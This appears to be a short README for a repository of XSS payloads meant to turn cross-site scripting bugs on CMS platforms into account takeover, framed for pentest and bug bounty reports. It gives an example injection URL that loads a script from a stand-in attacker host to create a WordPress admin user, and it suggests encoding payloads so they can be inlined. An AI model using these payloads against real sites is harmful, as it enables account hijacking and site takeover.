# Weaponised XSS Payloads
_XSS payloads designed to turn alert(1) into P1._

In this repository you will find a bunch of JavaScript files which can be loaded into an XSS payload in order to perform sensitive functions on popular CMS platforms in the context of the victim's browser. This can help to chain a plain old XSS bug into something more critical, like an account takeover.

This is perfect for beefing up the severity of a pentest or bug bounty report by demonstrating real security impact.

Pull requests are welcome.

## How To

The simplest way to use these payloads is to host them somewhere and load them into the src attribute of a script tag for your XSS payload like this:

```
https://example.com/vulnerable.php?param=<script src%3d"http://attacker.com/wordpress_create_admin_user.js"></script>
```

Alternatively, depending on the context and length of the payload, it can sometimes be [minified](https://javascript-minifier.com/), [encoded](https://eve.gd/2007/05/23/string-fromcharcode-encoder/) and then just included directly into the request.

## Credits

[This article](https://www.shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/) from Shift8 is what inspired me to make this repo. The JS in the article has a couple of minor typos but the concepts are spot on.
